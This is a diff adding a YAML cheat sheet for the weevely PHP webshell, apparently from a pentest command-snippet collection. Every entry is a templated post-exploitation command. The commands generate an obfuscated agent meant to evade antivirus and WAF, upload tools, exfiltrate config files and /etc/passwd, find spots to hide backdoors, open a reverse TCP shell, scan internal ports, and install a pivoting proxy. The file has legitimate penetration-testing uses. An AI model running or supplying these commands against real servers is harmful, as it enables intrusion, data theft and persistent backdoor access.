@@ -1,0 +1,106 @@
+tool: weevely
+tags: [web, webshell, post-exploitation, pentest, backdoor, php, security, enumeration]
+
+actions:
+  # === GENERATION AND CONNECTION ===
+  - title: weevely - generate php agent
+    desc: |
+      Generates a new polymorphic PHP agent with a custom password. 
+      The generated script is designed to be obfuscated to bypass signature-based antivirus and WAF detection. 
+      The password provided here will be required every time you want to connect to this specific shell.
+    command: "weevely generate {{password}} {{path|shell.php}}"
+
+  - title: weevely - connect to agent
+    desc: |
+      Establishes an interactive session with a previously uploaded Weevely agent. 
+      You must provide the full URL where the agent is hosted and the password used during generation. 
+      Once connected, you enter a specialized shell environment that supports both system commands and internal modules.
+    command: "weevely {{url}} {{password}}"
+
+  - title: weevely - execute single command
+    desc: |
+      Executes a single system command or Weevely module on the target without opening an interactive session. 
+      This is highly useful for automation, scripting, or quick checks of the target environment. 
+      The session terminates immediately after the command output is returned to the local terminal.
+    command: "weevely {{url}} {{password}} \"{{command|whoami}}\""
+
+  # === FILE OPERATIONS ===
+  - title: weevely - list directory contents
+    desc: |
+      Lists files and directories in a specific path on the target server. 
+      It provides detailed information including permissions, owner, group, and modification time. 
+      This module is essential for navigating the remote filesystem and identifying sensitive configuration files.
+    command: "weevely {{url}} {{password}} :file_ls {{directory|/var/www/html}}"
+
+  - title: weevely - upload local file
+    desc: |
+      Uploads a file from your local machine to the remote target's filesystem. 
+      This is a critical operation for transferring additional exploitation tools, scripts, or lateral movement binaries. 
+      Ensure that the web server user has sufficient write permissions in the destination directory.
+    command: "weevely {{url}} {{password}} :file_upload {{local_path}} {{remote_path}}"
+
+  - title: weevely - download remote file
+    desc: |
+      Downloads a file from the target server to your local machine. 
+      Commonly used for exfiltrating database configuration files, source code, or sensitive system files like /etc/passwd. 
+      Be cautious when downloading very large files as it may trigger network-based detection or timeout the request.
+    command: "weevely {{url}} {{password}} :file_download {{remote_path}} {{local_path}}"
+
+  - title: weevely - find files by name
+    desc: |
+      Searches for files on the target filesystem based on name patterns or attributes. 
+      This is useful for locating specific configuration files (e.g., config.php, .env) or sensitive backups across the entire drive. 
+      The module helps in targeted data discovery without manually browsing every directory.
+    command: "weevely {{url}} {{password}} :file_find {{path|/var/www}} {{name|config.php}}"
+
+  # === SYSTEM AUDIT AND ENUMERATION ===
+  - title: weevely - gather system information
+    desc: |
+      Collects comprehensive information about the target operating system, kernel version, and hardware architecture. 
+      This data is vital for selecting appropriate local privilege escalation exploits or understanding the OS environment. 
+      It also checks for available system binaries like python, perl, or gcc that can be used for further exploitation.
+    command: "weevely {{url}} {{password}} :system_info"
+
+  - title: weevely - audit filesystem permissions
+    desc: |
+      Audits the remote filesystem to find directories with weak or insecure permissions. 
+      It identifies world-writable folders or sensitive files that are readable by the web server user. 
+      This information is crucial for finding locations to hide backdoors or identifying misconfigurations.
+    command: "weevely {{url}} {{password}} :audit_filesystem"
+
+  - title: weevely - read /etc/passwd
+    desc: |
+      Attempts to read the /etc/passwd file using various techniques to bypass potential restrictions. 
+      This file provides a list of system users, which is essential for password spraying or identifying high-privilege accounts. 
+      The module tries different methods in case standard file reading is blocked by security configurations.
+    command: "weevely {{url}} {{password}} :audit_etcpasswd"
+
+  # === NETWORKING AND PIVOTING ===
+  - title: weevely - spawn reverse tcp shell
+    desc: |
+      Initiates a reverse TCP shell connection from the target back to your listener. 
+      This provides a more stable and fully interactive terminal compared to the request-response nature of a web shell. 
+      Make sure to have a listener like Netcat or Metasploit running on the specified IP and port before executing this command.
+    command: "weevely {{url}} {{password}} :backdoor_reversetcp {{ip}} {{port}}"
+
+  - title: weevely - internal port scan
+    desc: |
+      Performs a TCP port scan on the internal network or the localhost from the perspective of the target server. 
+      This allows you to discover internal services that are not exposed to the public internet, such as databases or management interfaces. 
+      It is a key step for pivoting and moving laterally within the target's internal infrastructure.
+    command: "weevely {{url}} {{password}} :net_scan {{target_ip|127.0.0.1}} {{ports|21,22,80,443,3306,5432}}"
+
+  - title: weevely - install php proxy
+    desc: |
+      Installs a PHP-based proxy on the target server to tunnel traffic through it. 
+      This allows you to browse internal web applications or bypass firewalls by using the compromised server as a gateway. 
+      This module is particularly effective for accessing internal-only admin panels or development environments.
+    command: "weevely {{url}} {{password}} :net_phpproxy"
+
+  # === DATABASE OPERATIONS ===
+  - title: weevely - interactive sql console
+    desc: |
+      Provides an interactive SQL console to execute queries directly against a database reachable by the target. 
+      It supports multiple DBMS types and requires valid credentials to establish the connection. 
+      This is much faster than manual exploitation for extracting data or modifying database records once credentials are found.
+    command: "weevely {{url}} {{password}} :sql_console --user {{db_user}} --pass {{db_pass}} --host {{db_host|localhost}} --db {{db_name}}"
